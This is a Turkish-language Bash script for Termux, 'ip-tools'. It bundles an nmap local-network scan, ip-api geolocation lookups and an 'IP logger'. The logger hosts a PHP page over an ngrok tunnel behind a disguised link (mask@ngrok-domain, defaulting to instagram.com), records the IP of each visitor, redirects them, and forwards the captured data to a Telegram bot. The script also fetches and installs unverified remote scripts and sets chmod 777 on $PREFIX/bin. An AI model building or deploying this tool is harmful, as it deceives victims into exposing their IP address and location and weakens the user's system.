#!/bin/bash

# WGET  PAKET KONTROLÜ #

if [[ ! -a $PREFIX/bin/wget ]];then
	echo
	echo
	echo
	printf "\e[32m[✓]\e[97m WGET PAKETİ KURULUYOR"
	echo
	echo
	echo
	pkg install wget -y
fi

# SCRİPTS CONTROLS

if [[ ! -a files/update.sh ]];then
	echo
	echo
	echo
	printf "\e[32m[✓]\e[97m GEREKLİ SCRİPTLER KURULUYOR.."
	echo
	echo
	echo

	# UPDATE.SH ( GÜNCELLEME SCRİPTİ )

	wget -O files/update.sh  https://raw.githubusercontent.com/umutkara-tools/UMUT-KARA-TOOLS/master/files/update.sh

	# BOT_UMUTKARATOOLS ( BİLDİRİM SCRİPTİ )

	wget -O $PREFIX/bin/bot_umutkaratools  https://raw.githubusercontent.com/umutkara-tools/UMUT-KARA-TOOLS/master/files/commands/bot_umutkaratools

	# LİNK-CREATE ( LİNK OLUŞTURMA SCRİPTİ )

	wget -O $PREFIX/bin/link-create https://raw.githubusercontent.com/umutkara-tools/UMUT-KARA-TOOLS/master/files/commands/link-create

	chmod 777 $PREFIX/bin/*
fi

if [[ $1 == update ]];then
	cd files
	bash update.sh update $2
	exit
fi

# NMAP  PAKET KONTROLÜ #

if [[ ! -a $PREFIX/bin/nmap ]];then
	echo
	echo
	echo
	printf "\e[32m[✓]\e[97m NMAP PAKETİ KURULUYOR"
	echo
	echo
	echo
	pkg install nmap -y
fi

# CURL  PAKET KONTROLÜ #

if [[ ! -a $PREFIX/bin/curl ]];then
	echo
	echo
	echo
	printf "\e[32m[✓]\e[97m CURL PAKETİ KURULUYOR"
	echo
	echo
	echo
	pkg install curl -y
fi

kontrol=$(which ip-tools |wc -l)
if [[ $kontrol == 0 ]];then
	echo -e "#!/bin/bash\ncd \$HOME/.IP-TOOLS\nbash ip-tools.sh \$1 \$2" > $PREFIX/bin/ip-tools
	chmod 777 $PREFIX/bin/ip-tools
	cd ..
	mv IP-TOOLS .IP-TOOLS
	echo
	echo
	echo
	printf "\e[32m[✓] \e[1;4;33mip-tools\e[0;97m KISAYOL OLUŞTURULDU"
	echo
	echo
	echo
	exit
fi
clear
cd files

##### UPDATE #####

bash update.sh --control
if [[ -a ../updates_infos ]];then
	rm ../updates_infos
	exit
fi
if [[ ! -a $PREFIX/lib/.bot_config ]];then
	exit
fi
##################

if [[ $1 == "" ]];then
	clear
	bash banner.sh
	echo
	echo
	echo
	printf "\e[97m
                  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+\e[1;33m
	                    |H|E|L|P|\e[0;97m
  	          +-+-+-+-+-+-+-+-+-+-+-+-+-+-+\e[97m


                      \e[33m[ \e[36mİP LOGGER OPTİONS \e[33m]


		      \e[32mip-tools \e[33m--logger\e[31m


         ──────────────────────────────────────────────────

                      \e[33m[ \e[36mİP SCAN OPTİONS \e[33m]


	              \e[32mip-tools \e[33m--scan\e[97m 216.58.212.46

		      \e[32mip-tools \e[33m--scan\e[97m google.com\e[31m

                      
         ──────────────────────────────────────────────────

		      \e[33m[\e[36m LOCAL İP SCAN OPTİONS \e[33m]
		      

		      \e[32mip-tools \e[33m --local\e[97m

		      "
	echo
	echo
	echo
	echo
	echo
	echo
	exit
fi
_local_scan() {
	clear
	echo
	echo
	bash banner.sh _ip_scan
	kontrol=$(ifconfig |grep -o "broadcast")
	if [[ $kontrol == broadcast ]];then
		echo
	else
		echo
		echo
		echo
		printf "\e[31m[!]\e[0m KABLOSUZ AĞ BAĞLANTISI YOK \e[31m!!!\e[0m"
		echo
		echo
		echo
		exit
	fi
	_nmap=$(ifconfig |grep -o 192.168.[0-9] |sed -n 1p)
	echo
	echo
	echo
	printf "\e[32m[*]\e[0m NMAP AĞ TARAMASI YAPILIYOR.."
	echo
	echo
	echo
	sleep 2
	#################### NMAP TARAMA ####################

	printf "
	\e[31m──────────────────────────────────────────────────
	\e[32m"
	echo
	echo
	echo
	nmap $_nmap.0/24
	echo
	echo
	echo
	printf "\e[32m[✓]\e[0m NMAP AĞ TARAMASI TAMAMLANDI"
	echo
	echo
	echo
	exit
}
_ip_scan() {
clear
echo
echo
bash banner.sh _ip_scan
ulke=$(cat .scan-output.txt |grep country\" |cut -d ':' -f 2 |tr -d '", ')
ulkekodu=$(cat .scan-output.txt |grep countryCode\" |cut -d ':' -f 2 |tr -d '", ')
bolge=$(cat .scan-output.txt |grep regionName\" |cut -d ':' -f 2 |tr -d '", ')
bolgeplaka=$(cat .scan-output.txt |grep region\" |cut -d ':' -f 2 |tr -d '", ')
sehir=$(cat .scan-output.txt |grep city\" |cut -d ':' -f 2 |tr -d '", ')
enlem=$(cat .scan-output.txt |grep lat\" |cut -d ':' -f 2 |tr -d '", ')
boylam=$(cat .scan-output.txt |grep lon\" |cut -d ':' -f 2 |tr -d '", ')
konum="$enlem,$boylam"
isp=$(cat .scan-output.txt |grep isp\" |cut -d ':' -f 2 |tr -d '", ')
asname=$(cat .scan-output.txt |grep asname\" |cut -d ':' -f 2 |tr -d '", ')
ip=$(cat .scan-output.txt |grep query\" |cut -d ':' -f 2 |tr -d '", ')
mobile=$(cat .scan-output.txt |grep mobile\" |cut -d ':' -f 2 |grep -o true)
proxy=$(cat .scan-output.txt |grep proxy\" |cut -d ':' -f 2 |grep -o true)
if [[ $proxy == true ]];then
	_vpn="Var"
else
	_vpn="Yok"
fi
if [[ $mobile == true ]];then
	internet="Mobil Veri"
else
	internet="Wifi"
fi
echo
echo
echo
printf "
            İP                          : \e[32m$ip\e[97m

	    İNTERNET                    : \e[32m$internet\e[97m

	    VPN                         : \e[32m$_vpn\e[97m

            ÜLKE                        : \e[32m$ulke\e[97m

            ÜLKE KODU                   : \e[32m$ulkekodu\e[97m
            
            BÖLGE                       : \e[32m$bolge\e[97m

            BÖLGE PLAKA                 : \e[32m$bolgeplaka\e[97m

            ŞEHİR                       : \e[32m$sehir\e[97m

            İNTERNET SERVİS SAĞLAYICISI : \e[32m$isp / $asname\e[97m

            KONUM                       : \e[32mhttps://www.google.com/maps/place/$konum/@$konum,16z\e[97m

"
echo
echo
echo
echo
rm .scan-output.txt
}
function finish() {
	control=$(ps aux | grep "ngrok" | grep -v grep |grep -o http)
	if [[ -n $control ]];then
		killall ngrok
		killall php
	fi
	exit
}
stty susp ""
stty eof ""
trap finish SIGINT

_ip_logger(){
	control=$(ps aux | grep "ngrok" | grep -v grep |grep -o http)
	if [[ -n $control ]];then
		killall ngrok
		killall php
	fi

# PHP  PAKET KONTROLÜ #

	if [[ ! -a $PREFIX/bin/php ]];then
		echo
		echo
		echo
		printf "\e[32m[*] \e[0mPHP PAKETİ KURULUYOR"
		echo
		echo
		echo
		pkg install php -y
	fi

# NGROK KONTROLÜ #

	if [[ ! -a $PREFIX/bin/ngrok ]];then
		echo
		echo
		echo
		printf "\e[33m[*] \e[0mNGROK YÜKLENİYOR "
		echo
		echo
		echo
		git clone https://github.com/umutkaratools/ngrok-kurulum
		cd ngrok-kurulum
		bash ngrok-kurulum.sh
		cd ..
		rm -rf ngrok-kurulum
	fi


	if [[ -a ip.txt ]];then
		rm ip.txt
	fi
	clear
	echo
	echo
	bash banner.sh _ip_logger
	echo
	echo
	echo -e "\e[97m  ÖRNEK : \e[32mhttps://t.me/umutkaratools\e[97m"
	echo
	echo
	read -e -p $'\e[31m───────[ \e[97mYÖNLENDİRELECEK ADRESİ GİRİNİZ\e[31m ]───────►  \e[0m' orientation
	echo
	echo
	echo
	echo -e "\e[1;97m  ÖRNEK : \e[32mhttps://instagram.com\e[97m\n\n  \e[97mNOT   : \e[33mHERHANGİ BİR SİTE ADI GİREBİLİRSİN"
	echo
	echo
	read -e -p $'\e[31m───────[ \e[97mMASKELEME ADRESİ GİRİNİZ\e[31m ]───────►  \e[0m' mask
	echo
	echo
	echo
	echo -e "\e[1;33m[*]\e[32m  LİNK OLUŞTURULUYOR\n\n\tLÜTFEN BEKLEYİNİZ...\e[97m"
	echo
	echo
	echo
	echo
	php -S 127.0.0.1:6667 & ngrok http 6667 > /dev/null &
	while :
	do
		kontrol=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o \"https://[^,]\*.ngrok.io\" |tr -d '"' |wc -l)
		if [[ $kontrol == 1 ]];then
			break
		fi
	done
	if [[ -n $orientation ]];then
		echo -e "$orientation" > .link
	else
		echo -e "https://t.me/umutkaratools" > .link
	fi
	if [[ ! -n $mask ]];then
		mask="https://instagram.com"
	fi
	url=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o \"https://[^,]\*.ngrok.io\" |tr -d '"')
	domain=$(echo -e "$url" |grep -o /[^,]\*.ngrok.io |tr -d '/')
	echo
	echo
	echo
	echo
	echo -e "\e[32mİP LOGGER LİNK : \e[97m$mask@$domain"
	echo
	echo
	echo
	echo
	printf "\e[1;97mBAĞLANTIYI KESMEK İÇİN\e[31m [\e[97m CTRL C \e[31m]\e[97m"
	echo
	echo
	echo
	if [[ -a ip-logger.txt ]];then
		rm ip-logger.txt
	fi
	while :
	do
		if [[ -a ip.txt ]];then
			sleep 1
			clear
			if [[ -a ip-logger.txt ]];then
				echo -e "\n" >> ip-logger.txt
			fi
			bash banner.sh _ip_logger
			cat ip.txt >> ip-logger.txt
			echo
			echo
			echo
			control=$(cat $PREFIX/lib/.bot_config |sed -n 2p)
			if [[ $control == telegram-bot ]];then
				echo "[✓] BİLGİ ALINDI" > .info
				bot_umutkaratools --send
				echo -e "$(cat ip.txt)" > .info
			else
				echo "[✓] BİLGİ ALINDI" > .info
			fi
			bot_umutkaratools --send
			echo -e "
	\t\t\e[1;33mBİLGİ ALINDI\n
	\e[31m──────────────────────────────────────────────────

	\e[32m$(cat ip-logger.txt)

	\e[31m──────────────────────────────────────────────────\e[0m"
			echo
			echo
			echo
			echo
			echo
			echo
			echo
			printf "\e[1;97mBAĞLANTIYI KESMEK İÇİN\e[31m [\e[97m CTRL C \e[31m]\e[97m"
			echo
			echo
			echo
			rm ip.txt
		fi
	done
	exit
}

if [[ $1 == --local ]];then
	_local_scan
	exit
fi
if [[ $1 == --scan ]];then
	curl -s ip-api.com/$2 > .scan-output.txt
	control=$(cat .scan-output.txt |grep -o success)
	if [[ $control != success ]];then
		echo
		echo
		echo
		printf "\e[31m[!]\e[97m HATALI İP VEYA DOMAİN \e[31m!!!\e[97m"
		echo
		echo
		echo
		rm .scan-output.txt
		exit
	fi
	_ip_scan
fi
if [[ $1 == --logger ]];then
	_ip_logger
	exit
fi

